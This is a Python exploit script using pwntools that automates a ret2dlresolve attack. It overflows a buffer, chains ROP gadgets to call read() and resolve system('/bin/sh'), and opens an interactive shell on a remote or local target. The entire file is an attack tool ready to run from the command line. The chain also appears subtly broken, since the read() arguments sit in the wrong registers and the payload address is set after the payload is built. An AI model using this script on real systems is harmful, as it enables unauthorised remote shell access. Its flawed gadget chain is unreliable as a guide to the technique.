#!/usr/bin/env python3
import sys
import struct
from pwn import *
from pwnlib.rop import ROP
from pwnlib.elf import ELF

class Ret2Dlresolve:
    def __init__(self, binary_path):
        self.elf = ELF(binary_path)
        self.rop = ROP(self.elf)
        self.dlresolve = Ret2dlresolvePayload(self.elf, symbol='system', args=['/bin/sh'])

    def build_chain(self, offset, write_addr=None):
        """
        offset: buffer overflow offset
        write_addr: where to write the dlresolve payload (e.g., .bss)
        """
        if not write_addr:
            write_addr = self.elf.bss() + 0x200
        self.dlresolve.address = write_addr
        chain = flat(
            b'A'*offset,
            self.rop.find_gadget(['pop rdi', 'ret'])[0],
            self.dlresolve.data_address,
            self.rop.find_gadget(['pop rsi', 'ret'])[0],
            len(self.dlresolve.payload),
            self.rop.find_gadget(['pop rdx', 'ret'])[0],
            0,
            self.elf.plt['read'],
            self.dlresolve.ret,
        )
        return chain, self.dlresolve.payload

    def exploit(self, target, port, offset, write_addr=None):
        chain, payload = self.build_chain(offset, write_addr)
        io = remote(target, port) if target != 'local' else process(self.elf.path)
        io.send(chain)
        time.sleep(0.5)
        io.send(payload)
        io.interactive()

def main():
    if len(sys.argv) < 4:
        print("Usage: 08_ret2dlresolve_auto.py <target> <port> <binary> [offset]")
        sys.exit(1)
    rd = Ret2Dlresolve(sys.argv[3])
    offset = int(sys.argv[4]) if len(sys.argv) > 4 else 72
    rd.exploit(sys.argv[1], int(sys.argv[2]), offset)

if __name__ == '__main__':
    main()